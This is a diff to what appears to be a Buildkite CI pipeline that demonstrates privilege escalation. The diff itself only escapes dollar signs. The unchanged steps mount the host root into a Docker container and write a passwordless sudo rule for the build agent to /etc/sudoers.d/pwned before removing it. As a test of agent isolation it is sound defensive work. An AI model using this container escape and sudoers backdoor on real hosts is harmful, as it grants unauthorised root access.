@@ -8,7 +8,7 @@ steps:
       set -euo pipefail
 
       run-as-root() {
-        docker run --userns=host -v /:/mnt/host -w /mnt/host alpine:latest "$@"
+        docker run --userns=host -v /:/mnt/host -w /mnt/host alpine:latest "$$@"
       }
 
       echo ~~~ Creating file as root
@@ -24,15 +24,15 @@ steps:
       ls -lA /
 
       echo +++ Who am I?
-      echo I am: "$(whoami)"
-      echo sudo I am: "$(sudo --non-interactive whoami || echo "sudo failed")"
+      echo I am: "$$(whoami)"
+      echo sudo I am: "$$(sudo --non-interactive whoami || echo "sudo failed")"
 
       echo --- Modifying sudoers
       run-as-root sh -c 'echo "buildkite-agent ALL=(ALL) NOPASSWD: ALL" > etc/sudoers.d/pwned'
 
       echo +++ Who am I?
-      echo I am: "$(whoami)"
-      echo sudo I am: "$(sudo --non-interactive whoami || echo "sudo failed")"
+      echo I am: "$$(whoami)"
+      echo sudo I am: "$$(sudo --non-interactive whoami || echo "sudo failed")"
 
       echo --- Cleaning up
       run-as-root rm -f etc/sudoers.d/pwned
